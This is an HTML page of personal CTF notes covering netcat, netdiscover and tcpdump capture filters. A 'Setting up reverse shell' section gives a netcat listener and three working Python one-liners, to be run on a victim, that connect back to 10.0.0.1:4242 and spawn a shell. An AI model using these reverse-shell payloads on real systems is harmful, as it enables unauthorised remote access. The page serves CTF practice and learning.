@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<head>
+  <title>jakeg -> notes -> listen</title>
+  <link rel="preload stylesheet" as="style" type="text/css" href="../css/fonts.css" />
+  <link rel="preload stylesheet" as="style" type="text/css" href="../css/main.css" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta charset="UTF-8">
+  <link rel="icon" type="image/png" sizes="32x32" href="../assets/icons/jake32.png"/>
+  <link rel="icon" type="image/png" sizes="16x16" href="../assets/icons/jake16.png"/>
+  <link rel="stylesheet" href="../css/wide.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta charset="UTF-8">
+  <meta property="og:type" content="website"/>
+  <meta property="og:image" content="https://jakegines.in/jake512"/>
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}});
+  </script>
+  <script type="text/javascript" async
+  src="../../libraries/MathJax-2.7.7/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+</head>
+<style>
+  a{
+    color: #8cade6;
+  }
+</style>
+<body>
+    <div class="container">
+    <div class="middle">
+      <div class="content">
+        <p>
+        <a href="/notes"><span class="arrow">&larr;&nbsp;</span>notes</a>
+        </p>
+        <h1 style="margin-bottom:10px;"><span style="color: #8cade6">listen</span></h1>
+        <div>
+All the related netcat and listener things related to CTFs.
+<br> 
+<br> 
+<h2 class='header unselectable' style='margin-top:2px; margin-bottom:8px;' id='Netdiscover'>Netdiscover</h2> 
+Listen to arp (address resolution protocol) things. 
+<br> 
+<br> 
+<h2 class='header unselectable' style='margin-top:2px; margin-bottom:8px;' id='Netcat'>Netcat</h2> 
+• Pushing a file to a client: <code class="highlighter-rouge" data-lang="text">nc -w3 [ip addr] [port] < file</code>
+<br> 
+• Receiving a file: <code class="highlighter-rouge" data-lang="text">nc -l -p [port] > outfile</code>
+<br> 
+• Grab a banner using netcat: <code class="highlighter-rouge" data-lang="text">echo "" | nc -v -n -w1 [target ip] [port]</code>
+<br> 
+• <code class="highlighter-rouge" data-lang="text">nc -nvv</code> -> very verbose
+<br> 
+<br> 
+<h2 class='header unselectable' style='margin-top:2px; margin-bottom:8px;' id='Settingupreverseshell'>Setting up reverse shell</h2> 
+Resources:
+<br> 
+• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank">github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a>
+<br> 
+<br> 
+First, set up netcat:
+<br> 
+<code class="highlighter-rouge" data-lang="text">nc -u -lvp 4242</code>
+<br> 
+<br> 
+On the victim, can run:
+<br> 
+• <code class="highlighter-rouge" data-lang="text">export RHOST="10.0.0.1";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</code>
+<br> 
+• <code class="highlighter-rouge" data-lang="text">python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'</code>
+<br> 
+• <code class="highlighter-rouge" data-lang="text">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code>
+<br> 
+<br> 
+<h2 class='header unselectable' style='margin-top:2px; margin-bottom:8px;' id='Listentothings'>Listen to things</h2> 
+• Capture any packet: <code class="highlighter-rouge" data-lang="text">sudo tcpdump -i any -w output.pcap</code>
+<br> 
+    - Then analyze: <code class="highlighter-rouge" data-lang="text">wireshark output.pcap</code>
+<br> 
+• Only listen to HTTP (port 80) traffic: <code class="highlighter-rouge" data-lang="text">sudo tcpdump -i any port 80 -w /path/to/outputfile.pcap</code>
+<br> 
+• Capture certain num of packets on interface eth0: <code class="highlighter-rouge" data-lang="text">sudo tcpdump -c 10 -i eth0</code>
+<br> 
+• filter by source: <code class="highlighter-rouge" data-lang="text">sudo tcpdump src 10.0.0.1</code>
+<br> 
+• filter by destination: <code class="highlighter-rouge" data-lang="text">sudo tcpdump dst 10.0.0.1</code>
+<br> 
+• filter by protocol: <code class="highlighter-rouge" data-lang="text">sudo tcpdump icmp</code>
+<br> 
+• filter by source port: <code class="highlighter-rouge" data-lang="text">sudo tcpdump src port 80</code>
+<br> 
+• filter by dst port: <code class="highlighter-rouge" data-lang="text">sudo tcpdump dst port 80</code>
+<br> 
+• capture with specific flags: <code class="highlighter-rouge" data-lang="text">sudo tcpdump 'tcp[13] & (tcp-syn|tcp-ack) != 0'</code>
+<br> 
+• capture with certain length: <code class="highlighter-rouge" data-lang="text">sudo tcpdump 'len > 0'</code>
+<br> 
+• dns traffic (port 53): <code class="highlighter-rouge" data-lang="text">sudo tcpdump port 53</code>
+<br> 
+• capture without resolving hostnames: <code class="highlighter-rouge" data-lang="text">sudo tcpdump -n</code>
+<br> 
+• capture of a large length: <code class="highlighter-rouge" data-lang="text">sudo tcpdump 'len > 100'</code>
+<br> 
+• filter by network: <code class="highlighter-rouge" data-lang="text">sudo tcpdump net 192.168.1.0/24</code>
+<br> 
+• increase verbosity: <code class="highlighter-rouge" data-lang="text">sudo tcpdump -vvv</code>
+<br> 
+        </div>
+        <br>
+      </div>
+    </div>
+  </div>
+</body>
+
